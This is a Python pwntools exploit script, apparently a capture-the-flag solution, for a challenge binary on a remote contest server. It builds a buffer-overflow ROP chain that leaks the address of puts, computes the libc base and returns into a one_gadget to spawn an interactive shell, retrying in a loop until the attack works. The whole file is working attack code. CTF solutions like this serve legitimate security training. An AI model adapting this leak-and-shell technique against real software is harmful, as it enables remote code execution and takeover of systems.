#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *
import struct

context.terminal = ["tmux", "neww"]
context.binary = elf = ELF("./chall")
libc = ELF("./lib/libc.so.6")

i = 0
with log.progress("enumerating") as pro:
    while True:
        i += 1
        pro.status(f"{i}")
        with context.quiet:
            p = remote("win.the.seetf.sg", 2004)
            # p = process("./chall")

        r1 = b"A" * 16 + p64(0x401313) + p64(elf.got.puts) + \
            p64(elf.sym.puts) + p64(0x401233)

        p.sendafter(b"tale.\n", r1 * (0x107 // len(r1)))
        p.sendlineafter(
            b"number!", str(
                struct.unpack(
                    "<f", p32(0xDDDDDDDD))[0]).encode())
        p.sendlineafter(
            b"number!", str(
                struct.unpack(
                    "<f", p32(0xDDDDDDDD))[0]).encode())
        p.sendlineafter(
            b"number!", str(
                struct.unpack(
                    "<f", p32(0xCCE841DD))[0]).encode())

        try:
            leak = unpack(
                p.recvuntil(
                    b"I live my life taking chances",
                    drop=True).strip(b"\n"),
                "all")
            log.info(f"leak at {hex(leak)}")
            libc.address = leak - libc.sym.puts

            log.info(f"libc base @ {hex(libc.address)}")
            one_gadget = 0xe3b01 + libc.address
            r2 = b"A" * 16 + p64(one_gadget)

            p.sendafter(b"tale.\n", r2 * (0x107 // len(r2)))
            p.sendlineafter(
                b"number!", str(
                    struct.unpack(
                        "<f", p32(0xDDDDDDDD))[0]).encode())
            p.sendlineafter(
                b"number!", str(
                    struct.unpack(
                        "<f", p32(0xDDDDDDDD))[0]).encode())
            p.sendlineafter(
                b"number!", str(
                    struct.unpack(
                        "<f", p32(0xCC0841DD))[0]).encode())

            p.interactive()
        except BaseException:
            with context.quiet:
                p.close()
            continue
